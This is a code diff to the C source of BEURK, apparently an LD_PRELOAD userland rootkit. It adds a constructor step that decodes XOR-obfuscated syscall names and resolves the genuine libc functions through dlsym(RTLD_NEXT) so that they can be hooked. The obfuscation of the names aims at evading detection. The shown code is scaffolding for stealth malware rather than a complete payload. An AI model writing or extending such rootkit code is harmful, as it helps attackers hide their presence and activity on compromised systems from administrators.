@@ -18,7 +18,13 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+/** 
+ *
+*/
+
 #include <string.h>
+#define _GNU_SOURCE /* for RTLD_NEXT macro in dlfcn.h */
+#include <dlfcn.h>
 #include "beurk.h"
 
 /** xorify a string whith XOR_KEY
@@ -48,9 +54,29 @@ static void     init_hidden_literals(void) {
     }
 }
 
+/** initializes the global array beurk_syscalls_list
+ * if dlsym fail, and DEBUG_MODE is activating, a error message
+ * is print.
+*/
+static void		init_syscalls_list() {
+	int		i;
+	char	*syscall;
+	char	*dl_error;
+
+	dlerror();
+	for (i = 0; i < SYS_SIZE; i++) {
+		syscall = xor(beurk_syscalls_tab[i]);
+		beurk_syscalls_list[i] = dlsym(RTLD_NEXT, syscall);
+		if ((dl_error = dlerror()) != NULL)
+			DEBUG(dl_error);
+	}
+}
+
 /** library constructor
  */
-void            init(void) {
+void        init(void)
+{
     DEBUG("init() constructor loaded");
     init_hidden_literals();
+	init_syscalls_list();
 }
